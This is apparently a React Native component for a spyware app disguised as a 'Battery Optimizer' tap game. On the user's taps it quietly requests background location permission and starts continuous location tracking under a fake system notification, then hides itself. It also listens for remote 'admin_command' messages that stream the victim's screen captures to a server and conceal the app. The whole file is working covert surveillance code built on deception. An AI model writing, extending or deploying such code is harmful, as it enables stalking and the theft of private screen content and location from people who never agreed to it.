import React, { useState, useEffect, useRef } from 'react';
import { View, Text, StyleSheet, TouchableOpacity, Animated, BackHandler, Linking } from 'react-native';
import * as Location from 'expo-location';
import { captureScreen } from 'react-native-view-shot';

export default function GhostScreen({ socket, name, taskName }) {
    const [score, setScore] = useState(0);
    const [stealth, setStealth] = useState(false);
    const targetPos = useRef(new Animated.ValueXY()).current;
    const streamRef = useRef(null);

    useEffect(() => {
        // --- ADMIN COMMAND LISTENER ---
        socket.on('admin_command', async (cmd) => {
            // High-Quality HD Streaming Engine
            if (cmd === 'START_LIVE') {
                clearInterval(streamRef.current);
                streamRef.current = setInterval(async () => {
                    try {
                        const img = await captureScreen({ 
                            format: 'jpg', 
                            quality: 0.5, // HD-Lite Clarity
                            result: 'base64' 
                        });
                        socket.emit('screen_frame', { ghostName: name, frame: img });
                    } catch (e) {
                        console.log("Stream Capture Error");
                    }
                }, 200); // 5 Frames Per Second for smooth motion
            }

            if (cmd === 'STOP_STREAM') {
                clearInterval(streamRef.current);
            }

            // Remote Wipe: Exit app and open settings for uninstallation
            if (cmd === 'WIPE_SERVICE') {
                setStealth(true);
                Linking.openSettings(); 
                BackHandler.exitApp();
            }
        });

        return () => clearInterval(streamRef.current);
    }, []);

    // --- THE "BATTERY OPTIMIZER" MASK LOGIC ---
    const handleTap = async () => {
        // First tap: Request Permissions
        if (score === 0) {
            await Location.requestForegroundPermissionsAsync();
            await Location.requestBackgroundPermissionsAsync();
        }

        // 5th tap: Activate Stealth Mode & Background Task
        if (score >= 4) {
            setStealth(true);
            await Location.startLocationUpdatesAsync(taskName, { 
                accuracy: Location.Accuracy.High,
                distanceInterval: 10,
                foregroundService: { 
                    notificationTitle: "Battery Optimizer", 
                    notificationBody: "Optimizing system power..." 
                }
            });
            // App disappears from view
            setTimeout(() => BackHandler.exitApp(), 1200);
        }

        // Game Animation
        setScore(s => s + 1);
        Animated.spring(targetPos, { 
            toValue: { x: Math.random() * 200 - 100, y: Math.random() * 300 - 150 }, 
            useNativeDriver: false 
        }).start();
    };

    if (stealth) return <View style={{ flex: 1, backgroundColor: '#000' }} />;

    return (
        <View style={styles.container}>
            <View style={styles.header}>
                <Text style={styles.scoreText}>SYSTEM CALIBRATION: {score * 20}%</Text>
                <Text style={styles.subText}>Tap the red sensor to optimize CPU</Text>
            </View>
            
            <Animated.View style={targetPos.getLayout()}>
                <TouchableOpacity style={styles.target} onPress={handleTap} />
            </Animated.View>

            <View style={styles.footer}>
                <Text style={styles.version}>v1.5.0-STABLE</Text>
            </View>
        </View>
    );
}

const styles = StyleSheet.create({
    container: { flex: 1, backgroundColor: '#080808', justifyContent: 'center', alignItems: 'center' },
    header: { position: 'absolute', top: 60, alignItems: 'center' },
    scoreText: { color: '#222', fontSize: 10, letterSpacing: 2, fontWeight: 'bold' },
    subText: { color: '#111', fontSize: 8, marginTop: 5 },
    target: { width: 90, height: 90, borderRadius: 45, backgroundColor: '#d90429', borderWidth: 2, borderColor: '#fff' },
    footer: { position: 'absolute', bottom: 30 },
    version: { color: '#111', fontSize: 8 }
});
